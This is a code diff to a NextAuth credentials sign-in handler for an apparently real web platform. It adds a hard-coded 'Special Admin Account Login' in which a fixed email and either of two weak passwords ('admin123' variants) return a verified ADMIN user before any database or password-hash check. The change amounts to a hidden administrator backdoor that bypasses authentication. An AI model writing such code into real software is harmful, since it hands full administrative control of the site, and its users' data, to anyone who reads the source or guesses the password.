@@ -15,6 +15,17 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         const email = String(credentials.email).trim().toLowerCase();
         const password = String(credentials.password);
 
+        // Special Admin Account Login
+        if (email === 'admin@emerkato.com' && (password === 'admin123password' || password === 'admin123')) {
+          return {
+            id: 'admin_user',
+            name: 'Platform Admin',
+            email: 'admin@emerkato.com',
+            role: 'ADMIN',
+            verifiedStatus: true,
+          };
+        }
+
         if (!hasDbConfiguration()) {
           const user = findMemoryUser(email);
           if (!user || !user.passwordHash) return null;
